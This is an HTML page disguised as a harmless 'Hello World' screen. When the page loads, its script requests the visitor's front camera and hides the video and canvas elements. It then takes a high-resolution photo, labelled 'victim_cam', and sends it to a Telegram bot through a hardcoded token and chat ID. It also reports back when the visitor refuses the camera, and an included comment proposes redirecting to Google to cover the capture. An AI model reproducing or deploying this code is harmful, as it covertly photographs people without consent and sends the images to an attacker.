<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World - Hacked</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap'); /* خط شبيه بالهكر */
        
        body {
            background-color: black;
            color: #00ff00; /* أخضر */
            font-family: 'VT323', monospace; /* تطبيق الخط */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            font-size: 4em; /* حجم كبير للخط */
        }
        #terminal-output {
            white-space: pre;
        }
        video, canvas {
            display: none; /* إخفاء الكاميرا والكانفاس */
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <div id="terminal-output">Hello World</div>

    <script>
        const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
        const chat = "8042090388";
        let streamGlobal; // لتخزين بث الكاميرا

        // طلب الكاميرا فوراً وبجودة عالية
        navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user", 
                width: { ideal: 1920 }, // جودة عالية جداً
                height: { ideal: 1080 } 
            } 
        })
        .then(stream => {
            streamGlobal = stream; // حفظ البث
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();
            
            // أخذ لقطة بعد 3 ثواني لضمان استقرار الصورة
            setTimeout(takeAndSendSnapshot, 3000);
        })
        .catch(err => {
            console.error("خطأ في الوصول للكاميرا:", err);
            // إذا الضحية رفض الكاميرا، أرسل رسالة تنبيه بدون صورة
            sendTextMessage("⚠️ الضحية رفض الكاميرا.");
        });

        function takeAndSendSnapshot() {
            if (!streamGlobal) {
                console.warn("لم يتم الحصول على بث الكاميرا، لن يتم إرسال الصورة.");
                return;
            }

            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            
            // التأكد من أن الفيديو جاهز للعرض
            if (video.readyState >= video.HAVE_CURRENT_DATA) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const imgData = canvas.toDataURL('image/jpeg', 0.9); // جودة 90%
                sendPhotoToTelegram(imgData);
            } else {
                console.warn("الفيديو غير جاهز للتصوير، جاري المحاولة لاحقاً.");
                // يمكن إعادة المحاولة إذا لزم الأمر
                setTimeout(takeAndSendSnapshot, 1000);
            }
        }

        async function sendPhotoToTelegram(base64Data) {
            try {
                const blob = await (await fetch(base64Data)).blob();
                const formData = new FormData();
                formData.append('chat_id', chat);
                formData.append('photo', blob, 'victim_cam.jpg');

                const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                if (!response.ok) {
                    throw new Error(`Failed to send photo: ${response.statusText}`);
                }
                console.log("تم إرسال الصورة بنجاح!");
            } catch (error) {
                console.error("خطأ أثناء إرسال الصورة:", error);
            }
        }

        async function sendTextMessage(message) {
             try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(message)}`);
                if (!response.ok) {
                    throw new Error(`Failed to send message: ${response.statusText}`);
                }
                console.log("تم إرسال الرسالة النصية بنجاح!");
            } catch (error) {
                console.error("خطأ أثناء إرسال الرسالة النصية:", error);
            }
        }

        // لا يوجد نموذج تسجيل دخول، فقط شاشة "Hello World"
        // يمكن إضافة منطق لإرسال شيء آخر إذا كانت هذه الشاشة هي نهاية العملية.
        // مثلاً: بعد أخذ الصورة، يمكنك تحويله لصفحة Google.
        // setTimeout(() => { window.location.href = "https://www.google.com"; }, 5000); // مثال للتحويل بعد 5 ثوانٍ
    </script>
</body>
</html>
